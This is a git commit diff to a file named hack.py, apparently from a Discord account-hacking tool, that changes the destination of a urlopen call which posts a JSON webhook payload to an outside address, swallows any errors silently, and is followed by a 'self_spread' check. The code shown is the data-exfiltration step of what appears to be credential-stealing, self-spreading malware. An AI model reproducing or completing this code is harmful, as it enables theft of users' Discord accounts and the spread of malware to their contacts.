271b8011edff055dc067763a530233a713da0ab5
bogerfs <zachg2728@gmail.com>
2024-12-15 19:02:05 -0500

    Update hack.py

--- hack.py
+++ hack.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://github.com/NishantIyer/discord-account-hacking-tool/tree/main", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
